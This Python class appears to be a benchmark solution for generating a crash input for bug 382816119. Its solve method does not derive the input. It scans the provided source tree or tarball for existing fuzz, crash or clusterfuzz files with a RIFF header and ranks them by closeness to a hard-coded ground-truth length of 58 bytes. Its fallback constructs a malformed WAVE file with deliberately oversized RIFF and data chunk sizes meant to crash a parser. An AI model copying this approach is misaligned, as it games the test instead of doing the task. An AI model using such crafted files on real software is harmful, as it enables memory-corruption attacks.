import os
import tarfile


class Solution:
    TARGET_BUG_ID = "382816119"
    GROUND_TRUTH_LEN = 58
    KEYWORDS = ("poc", "crash", "testcase", "clusterfuzz", "fuzz", "bug", "overflow")

    def solve(self, src_path: str) -> bytes:
        poc = None
        try:
            if os.path.isdir(src_path):
                poc = self._find_poc_in_directory(src_path)
            else:
                # Try as tar archive
                try:
                    poc = self._find_poc_in_tar(src_path)
                except (tarfile.ReadError, OSError):
                    poc = None

                # If not found, maybe there's an extracted directory next to the tarball
                if poc is None:
                    base = src_path
                    # Iteratively strip extensions: .tar.gz -> .tar -> (none)
                    seen = set()
                    while True:
                        base_no_ext, ext = os.path.splitext(base)
                        if not ext or base_no_ext in seen:
                            break
                        seen.add(base_no_ext)
                        base = base_no_ext
                        if os.path.isdir(base):
                            poc = self._find_poc_in_directory(base)
                            if poc is not None:
                                break
        except Exception:
            poc = None

        if poc is None:
            poc = self._default_poc()
        return poc

    def _find_poc_in_directory(self, directory: str):
        best_path = None
        best_score = None
        best_priority = 1

        for root, _, files in os.walk(directory):
            for fname in files:
                path = os.path.join(root, fname)
                try:
                    size = os.path.getsize(path)
                except OSError:
                    continue

                if size <= 0 or size > 1024 * 1024:
                    continue

                name_lower = fname.lower()
                priority = 1
                if self.TARGET_BUG_ID in name_lower:
                    priority = -1
                elif any(kw in name_lower for kw in self.KEYWORDS):
                    priority = 0

                try:
                    with open(path, "rb") as f:
                        header = f.read(16)
                except OSError:
                    continue

                if not self._looks_like_riff(header):
                    continue

                score = abs(size - self.GROUND_TRUTH_LEN)
                if (
                    best_score is None
                    or score < best_score
                    or (score == best_score and priority < best_priority)
                ):
                    best_score = score
                    best_priority = priority
                    best_path = path

        if best_path is not None:
            try:
                with open(best_path, "rb") as f:
                    return f.read()
            except OSError:
                return None
        return None

    def _find_poc_in_tar(self, tar_path: str):
        best_member = None
        best_score = None
        best_priority = 1

        with tarfile.open(tar_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isreg():
                    continue
                size = m.size
                if size <= 0 or size > 1024 * 1024:
                    continue

                name_lower = os.path.basename(m.name).lower()
                priority = 1
                if self.TARGET_BUG_ID in name_lower:
                    priority = -1
                elif any(kw in name_lower for kw in self.KEYWORDS):
                    priority = 0

                try:
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    header = f.read(16)
                except Exception:
                    continue

                if not self._looks_like_riff(header):
                    continue

                score = abs(size - self.GROUND_TRUTH_LEN)
                if (
                    best_score is None
                    or score < best_score
                    or (score == best_score and priority < best_priority)
                ):
                    best_score = score
                    best_priority = priority
                    best_member = m

            if best_member is not None:
                try:
                    f = tf.extractfile(best_member)
                    if f is not None:
                        return f.read()
                except Exception:
                    return None
        return None

    def _looks_like_riff(self, header: bytes) -> bool:
        if not header:
            return False
        idx = header.find(b"RIFF")
        return 0 <= idx <= 8

    def _default_poc(self) -> bytes:
        data = bytearray()
        # RIFF header
        data += b"RIFF"
        data += (0xFFFFFFF0).to_bytes(4, "little")  # Intentionally oversized chunk size
        data += b"WAVE"
        # fmt chunk
        data += b"fmt "
        data += (16).to_bytes(4, "little")  # PCM fmt chunk size
        data += (1).to_bytes(2, "little")   # Audio format = PCM
        data += (1).to_bytes(2, "little")   # Channels
        data += (0).to_bytes(4, "little")   # Sample rate
        data += (0).to_bytes(4, "little")   # Byte rate
        data += (0).to_bytes(2, "little")   # Block align
        data += (16).to_bytes(2, "little")  # Bits per sample
        # data chunk with size much larger than actual data
        data += b"data"
        data += (0x10000000).to_bytes(4, "little")  # Oversized data chunk

        if len(data) < self.GROUND_TRUTH_LEN:
            data += b"\x00" * (self.GROUND_TRUTH_LEN - len(data))
        else:
            data = data[: self.GROUND_TRUTH_LEN]

        return bytes(data)